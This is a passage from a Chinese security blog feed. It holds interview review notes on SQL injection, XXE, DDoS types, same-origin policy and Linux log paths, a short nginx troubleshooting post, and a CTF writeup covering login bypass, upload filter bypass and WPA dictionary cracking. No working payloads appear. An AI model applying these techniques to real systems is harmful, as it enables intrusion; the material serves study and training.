SQL注入的类型以及防御</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>这里采用看雪的一篇文章，此处引用的文章地址为本文参考资料3。</p><p>1、常见的sql注入按照参数类型可分为两种：数字型和字符型。</p><p> </p><p>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p><p> </p><p>2、也可以根据数据库返回的结果，分为三种：回显注入、报错注入、盲注。</p><p> </p><p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p><p> </p><p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p><p> </p><p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p><p> </p><p>3、按照注入位置及方式不同分为以下几种：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>这里采用知乎上的一个问答，此处引用的文章地址为本文参考资料4。</p><p>问：</p><p>如何从根本上防止 SQL 注入？</p><p>SQL注入导致的安全问题数不胜数，为什么这么多年来同样的问题一再发生？</p><p>如果是因为SQL脚本拼接的原因，为什么不在新的实现中采用api调用的方式来杜绝漏洞？</p><p>答：</p><p>SQL注入并不是一个在SQL内不可解决的问题，这种攻击方式的存在也不能完全归咎于SQL这种语言，因为注入的问题而放弃SQL这种方式也是因噎废食。首先先说一个我在其他回答中也曾提到过的观点：<strong>没有（运行时）编译，就没有注入。</strong></p><p>SQL注入产生的原因，和栈溢出、XSS等很多其他的攻击方法类似，就是未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。针对于SQL注入，则是用户提交的数据，被数据库系统编译而产生了开发者预期之外的动作。也就是，SQL注入是用户输入的数据，在拼接SQL语句的过程中，超越了数据本身，成为了SQL语句查询逻辑的一部分，然后这样被拼接出来的SQL语句被数据库执行，产生了开发者预期之外的动作。</p><p>所以从根本上防止上述类型攻击的手段，还是避免数据变成代码被执行，时刻分清代码和数据的界限。而具体到SQL注入来说，被执行的恶意代码是通过数据库的SQL解释引擎编译得到的，所以只要<strong>避免用户输入的数据被数据库系统编译</strong>就可以了。</p><p>至于如何避免用户输入的数据被数据库系统编译，我觉着可以参考CSDN上的一篇文章，详见本文参考资料5，该文具体说了以下内容：</p><p>1、escape处理</p><p>2、使用预编译语句</p><p>3、使用存储过程</p><p>4、检查数据类型</p><p>5、使用安全函数</p><h1 id="0x03-XXE攻击的概念"><a href="#0x03-XXE攻击的概念" class="headerlink" title="0x03 XXE攻击的概念"></a>0x03 XXE攻击的概念</h1><p>这个我不确定当时面试有没有问，不过刚才突然想到了，而且自己对XXE攻击也不是很了解，所以就简单记一下吧，此处引用的文章地址为本文参考资料6。</p><p>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。</p><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体根据引用方式，还可分为内部实体与外部实体，xxe漏洞主要是利用了DTD引用外部实体导致的漏洞。</p><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。如果是linux下，可以读取/etc/passwd等目录下敏感数据。</p><p>XXE的漏洞检测：</p><p>1、检测XML是否会被成功解析</p><p>2、检测服务器是否支持DTD引用外部实体，如果支持引用外部实体，那么很有可能是存在xxe漏洞的。</p><p>XXE的修复与防御：</p><p>1、使用开发语言提供的禁用外部实体的方法</p><p>2、过滤用户提交的XML数据</p><h1 id="0x04-DDOS的类型"><a href="#0x04-DDOS的类型" class="headerlink" title="0x04 DDOS的类型"></a>0x04 DDOS的类型</h1><p>说到DDOS，我的第一反应就是TCP SYN泛洪攻击，对于其他的类型却了解很少，所以这里也同样记录一下，此处引用的文章地址为本文参考资料7。</p><p>首先有两类最常见的 DDoS 攻击，一是资源耗尽型；二是导致异常型，接下来就概要的说一下。</p><p>1、SYN Flood攻击即洪水攻击是通过TCP建立3次握手连接的漏洞产生，主要通过发送源IP虚假的SYN报文，使目标主机无法与其完成3次握手，因而占满系统的协议栈队列，致使资源得不到释放，进而达成拒绝服务的目的，SYN Flood攻击是移动互联网中DDoS攻击最主要的形式之一。</p><p>2、ACK Flood是对虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如SYN Flood。属于原始方式的DDoS攻击。 </p><p>3、UDP Flood是使用原始套接字伪造大量虚假源IP的UDP包，主要以DNS协议为主。 </p><p>4、ICMP Flood 即Ping攻击，是一种比较古老的方式。</p><p>5、CC攻击即ChallengeCollapsar挑战黑洞，主要通过大量的肉鸡或者寻找匿名代理服务器，模拟真实的用户向目标发起大量的访问请求，导致消耗掉大量的并发资源，使网站打开速度慢或拒绝服务。现阶段CC攻击是应用层攻击方式之一。 </p><p>6、DNS Flood主要是伪造海量的DNS请求，用于掩盖目标的DNS服务器。 </p><p>7、慢速连接攻击是针对HTTP协议，以slowloris攻击为起源，然后建立HTTP连接，设置一个较大的传输长度，实际每次发送很少字节，让服务器认为HTTP头部没有传输完成，因此数据传输越多就会造成连接资源耗尽。 </p><p>8、DOS攻击利用一些服务器程序的bug、安全漏洞、和架构性缺陷，然后通过构造畸形请求发送给服务器，服务器因不能判断处理恶意请求而瘫痪，造成拒绝服务。 </p><h1 id="0x05-跨域请求的概念"><a href="#0x05-跨域请求的概念" class="headerlink" title="0x05 跨域请求的概念"></a>0x05 跨域请求的概念</h1><p>以前记得在哪里有看到过这个，但是现在已经忘的差不多了，因此再复习复习，此处引用的文章地址为本文参考资料8。</p><p>同源是指相同的协议、域名、端口，三者都相同才属于同源。同源策略浏览器出于安全考虑，在全局层面禁止了页面加载或执行与自身来源不同的域的任何脚本，站外其他来源的脚本同页面的交互则被严格限制。</p><p>跨域由于浏览器同源策略，凡是发送请求url的协议、域名、端口三者之间任意一与当前页面地址不同即为跨域。</p><p>看看哪些情况下属于跨域访问：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x06-Linux的日志文件位置"><a href="#0x06-Linux的日志文件位置" class="headerlink" title="0x06 Linux的日志文件位置"></a>0x06 Linux的日志文件位置</h1><p>讲道理，在面试前几天我在搭建一个三层靶机的环境，当时还查过Linux的日志文件位置的文章，但是在面试的时候却忘掉了，这就有点难受了，所以再记录一下吧，此处引用的文章地址为本文参考资料9。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;log&#x2F;messages   ：常规日志消息&#x2F;var&#x2F;log&#x2F;boot       ：系统启动日志&#x2F;var&#x2F;log&#x2F;debug      ：调试日志消息&#x2F;var&#x2F;log&#x2F;auth.log   ：用户登录和身份验证日志&#x2F;var&#x2F;log&#x2F;daemon.log ：运行squid，ntpd等其他日志消息到这个文件&#x2F;var&#x2F;log&#x2F;dmesg      ：Linux内核环缓存日志&#x2F;var&#x2F;log&#x2F;dpkg.log   ：所有二进制包日志都包括程序包安装和其他信息&#x2F;var&#x2F;log&#x2F;faillog    ：用户登录日志文件失败&#x2F;var&#x2F;log&#x2F;kern.log   ：内核日志文件&#x2F;var&#x2F;log&#x2F;lpr.log    ：打印机日志文件&#x2F;var&#x2F;log&#x2F;mail.*     ：所有邮件服务器消息日志文件&#x2F;var&#x2F;log&#x2F;mysql.*    ：MySQL服务器日志文件&#x2F;var&#x2F;log&#x2F;user.log   ：所有用户级日志&#x2F;var&#x2F;log&#x2F;xorg.0.log ：X.org日志文件&#x2F;var&#x2F;log&#x2F;apache2&#x2F;*  ：Apache Web服务器日志文件目录&#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;* ：Lighttpd Web服务器日志文件目录&#x2F;var&#x2F;log&#x2F;fsck&#x2F;*     ：fsck命令日志&#x2F;var&#x2F;log&#x2F;apport.log ：应用程序崩溃报告&#x2F;日志文件&#x2F;var&#x2F;log&#x2F;syslog     ：系统日志&#x2F;var&#x2F;log&#x2F;ufw        ：ufw防火墙日志&#x2F;var&#x2F;log&#x2F;gufw       ：gufw防火墙日志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x07-Linux的各目录含义"><a href="#0x07-Linux的各目录含义" class="headerlink" title="0x07 Linux的各目录含义"></a>0x07 Linux的各目录含义</h1><p>这个是以前大一大二的时候学的了，现在只记住了平时经常用的那几个目录，所以当时感觉回答的并不是很好，因此这里也简单记录一下，此处引用的文章地址为本文参考资料10。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;bin   重要的二进制 (binary) 应用程序&#x2F;boot  启动 (boot) 配置文件&#x2F;dev   设备 (device) 文件&#x2F;etc   配置文件、启动脚本等 (etc)&#x2F;home  本地用户主 (home) 目录&#x2F;lib   系统库 (libraries) 文件&#x2F;media 挂载可移动介质 (media)&#x2F;mnt   挂载 (mounted) 文件系统&#x2F;opt   提供一个供可选的 (optional) 应用程序安装目录&#x2F;proc  特殊的动态目录&#x2F;root  root (root) 用户主文件夹，读作“slash-root”&#x2F;sbin  重要的系统二进制 (system binaries) 文件&#x2F;srv   服务（serve）文件&#x2F;sys   系统 (system) 文件&#x2F;tmp   临时(temporary)文件&#x2F;usr   包含绝大部分所有用户(users)都能访问的应用程序和文件&#x2F;var   经常变化的(variable)文件，诸如日志或数据库等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><p>暂时印象较深的也就想到这些了，说实话，虽然看着这篇文章记下了很多东西，但是我感觉自己脑子里还是没有记住多少东西，这些东西还是要经常去用才能记得住呀，平时不去用不去碰真的太容易忘了。通过这次面试也认识到自己的很多不足，所以不管最后面试结果怎么样，自己有收获就好，毕竟就像新东方唐叔说的：能力的提升不在于你做了多少道题，而在于你做了多少总结。</p><p>我觉着这句话再衍生一下就是能力的提升在于总结两个字，也就是说我自己犯了这些错误，有没有去总结，如果总结又总结了多少？而我觉着这些总结正是单属于我自己的宝贵财富，好了，不瞎扯了，感觉马上都变成鸡汤了 [ 笑哭 ]</p><p>参考资料：</p><blockquote><p>1、<a href="https://zhuanlan.zhihu.com/p/28657325">https://zhuanlan.zhihu.com/p/28657325</a><br>2、<a href="https://blog.csdn.net/pygain/article/details/52912521">https://blog.csdn.net/pygain/article/details/52912521</a><br>3、<a href="https://www.kanxue.com/book-6-110.htm">https://www.kanxue.com/book-6-110.htm</a><br>4、<a href="https://www.zhihu.com/question/22953267">https://www.zhihu.com/question/22953267</a><br>5、<a href="https://blog.csdn.net/hitwangpeng/article/details/45534787">https://blog.csdn.net/hitwangpeng/article/details/45534787</a><br>6、<a href="https://thief.one/2017/06/20/1/">https://thief.one/2017/06/20/1/</a><br>7、<a href="http://blog.itpub.net/69925937/viewspace-2647388/">http://blog.itpub.net/69925937/viewspace-2647388/</a><br>8、<a href="https://blog.csdn.net/haozhoupan/article/details/51151656">https://blog.csdn.net/haozhoupan/article/details/51151656</a><br>9、<a href="https://blog.csdn.net/qq_33571718/article/details/78373653">https://blog.csdn.net/qq_33571718/article/details/78373653</a><br>10、<a href="https://www.jianshu.com/p/43f6785e0589">https://www.jianshu.com/p/43f6785e0589</a><br>感谢以上文章的作者，如有侵权，烦请于我的公众号TeamsSix进行私信联系。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】VPS欠费后Hexo博客521无法访问</title>
      <link href="//191009-164624.html"/>
      <url>//191009-164624.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x01-排查过程"><a href="#0x01-排查过程" class="headerlink" title="0x01 排查过程"></a>0x01 排查过程</h1><p>排查的过程中，碰到的第一个问题就是我发现SSH连接不上了，第一反应是博客被黑了？之后修改密码后才登上，估计只是我忘记密码了吧<br>之后又发现hexo同步本地数据同步不上去，怎么搞都不行，之后过了一天，发现又可以同步了，这……玄学问题？<br>直到博客无法访问第三天，我到网上四处找寻结果，还是没找到我碰到的这个问题，最后突然看到有人提到hexo使用的是nginx网页服务器，这才恍然大悟，我博客的nginx没有开！</p><h1 id="0x02-解决步骤"><a href="#0x02-解决步骤" class="headerlink" title="0x02 解决步骤"></a>0x02 解决步骤</h1><p>直接进入自己VPS的命令行输入nginx开启nginx服务就行了，之后如果不放心可以输入netstat -ant看看自己的80端口有没有开。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@VPS_name ~<span class="token punctuation">]</span><span class="token comment"># nginx</span><span class="token punctuation">[</span>root@VPS_name ~<span class="token punctuation">]</span><span class="token comment"># netstat -ant</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x03-一点思考"><a href="#0x03-一点思考" class="headerlink" title="0x03 一点思考"></a>0x03 一点思考</h1><p>讲道理，最后发现是这样的一个原因，还是挺尴尬的，博客自从搭建好后，几个月都没有碰过这些环境的问题，以前VPS重启nginx也是自动开启的，这次不知道为什么突然不行了，同时也感觉到有些东西长时间不碰，即使当初看着多么简单的东西也变难了起来。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> VPS </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】记录一次CTF比赛的Writeup</title>
      <link href="//190925-114420.html"/>
      <url>//190925-114420.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。</p><p>题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。</p><p>废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。</p><a id="more"></a><h1 id="0x01-隐写-1"><a href="#0x01-隐写-1" class="headerlink" title="0x01 隐写 1"></a>0x01 隐写 1</h1><pre class="line-numbers language-none"><code class="language-none">flag：steganoIflag格式：passwd:题目来源：http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;training&#x2F;stegano1&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>签到题，下载题目图片，利用记事本打开即可看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-隐写-2"><a href="#0x02-隐写-2" class="headerlink" title="0x02 隐写 2"></a>0x02 隐写 2</h1><pre class="line-numbers language-none"><code class="language-none">flag：teamssixHint:一般在公共场合才能看的见题型参考：http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;connect_the_dots&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>打开图片，参考题目提示说一般在公共场合才能看见，因此通过盲文对照表可以得出flag是teamssix，图片中的AXHU只是用来干扰的，这道题也是我参考wechall里面的一道题型。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-Web-1"><a href="#0x03-Web-1" class="headerlink" title="0x03 Web 1"></a>0x03 Web 1</h1><pre class="line-numbers language-none"><code class="language-none">flag:iamflagsafsfskdf11223Hint:站内有提示题目地址：http:&#x2F;&#x2F;lab1.xseclab.com&#x2F;sqli2_3265b4852c13383560327d1c31550b60&#x2F;index.php参考来源：http:&#x2F;&#x2F;hackinglab.cn&#x2F;ShowQues.php?type&#x3D;sqlinject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、打开题目地址<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、查看源码找到提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、根据提示使用admin登陆，并使用弱密码<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、尝试多次都提示失败，利用万能密码再做尝试，找到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x04-Web-2"><a href="#0x04-Web-2" class="headerlink" title="0x04 Web 2"></a>0x04 Web 2</h1><pre class="line-numbers language-none"><code class="language-none">flag:76tyuh12OKKytig#$%^&amp;题目地址：http:&#x2F;&#x2F;lab1.xseclab.com&#x2F;upload3_67275a14c1f2dbe0addedfd75e2da8c1&#x2F;flag格式：key is :题目来源：http:&#x2F;&#x2F;hackinglab.cn&#x2F;ShowQues.php?type&#x3D;upload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、打开题目地址，发现是一个文件上传界面<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、先把Burp挂上，随便上传一个JPG图片试试，并来到Burp重发这个包<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、在Burp中对文件名进行修改，比如在jpg后加上.png或者其他东西，成功看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x05-soeasy"><a href="#0x05-soeasy" class="headerlink" title="0x05 soeasy"></a>0x05 soeasy</h1><pre class="line-numbers language-none"><code class="language-none">flag:HackingLabHdd1b7c2fb3ff3288bffHint:在这个文件中找到key就可以通关flag格式:key:题目来源：http:&#x2F;&#x2F;hackinglab.cn&#x2F;ShowQues.php?type&#x3D;pentest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解法一：</strong><br>1、下载文件后，发现是vmdk文件，利用DeskGenius打开后，发现Key，此为正确答案<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>解法二：</strong><br>1、利用Vmware映射虚拟硬盘同样可以打开<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf15.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x06-Crack"><a href="#0x06-Crack" class="headerlink" title="0x06 Crack"></a>0x06 Crack</h1><pre class="line-numbers language-none"><code class="language-none">flag:19940808Hint:flag就是密码题目：邻居悄悄把密码改了，你只知道邻居1994年出生的，能找到她的密码吗？题目来源：http:&#x2F;&#x2F;hackinglab.cn&#x2F;ShowQues.php?type&#x3D;decrypt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、下载题目文件，根据题意，需要对WiFi密码破解，而且密码很有可能是邻居的生日，因此我们利用工具生成字典。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf16.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、接下来利用ewsa进行破解，可以看到破解后的密码<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf17.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>这道题目当时实验室有人用kali做的，kali下的工具感觉破解速度更快。</p><h1 id="0x07-BiliBili"><a href="#0x07-BiliBili" class="headerlink" title="0x07 BiliBili"></a>0x07 BiliBili</h1><pre class="line-numbers language-none"><code class="language-none">flag:Congratulations_you_got_it题目：bilibiliflag格式：ctf&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解法一：</strong><br>1、使用Wireshark打开数据包，直接搜索ctf<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf18.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、找到标识的那一行右击进行追踪对应的协议，比如这条是http协议就追踪http协议，之后再次查找ctf<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf19.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、发现ctf括号后的内容为base64加密，解密即可得到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf20.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><strong>解法二：</strong><br>1、和解法一一样，对数据包进行追踪http流，不难看出这是访问space.bilibili.com/148389186的一个数据包<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf21.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、打开这个网址，同样可以看到被base64加密的flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf22.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>另外打个小广告，上面这个是我的bilibili号（TeamsSix），欢迎大家关注，嘿嘿</p><h1 id="0x08-Check"><a href="#0x08-Check" class="headerlink" title="0x08 Check"></a>0x08 Check</h1><pre class="line-numbers language-none"><code class="language-none">flag:sAdf_fDfkl_Fdf题目：简单的逆向flag格式：flag&#123;&#125;题目来源：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;QKSword&#x2F;p&#x2F;9095242.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、下载文件，发现是exe文件，放到PEiD里看看有没有壳以及是什么语言编写的，如果有壳需要先脱壳。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、可以看到使用的C语言写的，同时是32位，因此使用IDA32位打开，之后找到main函数<br><img 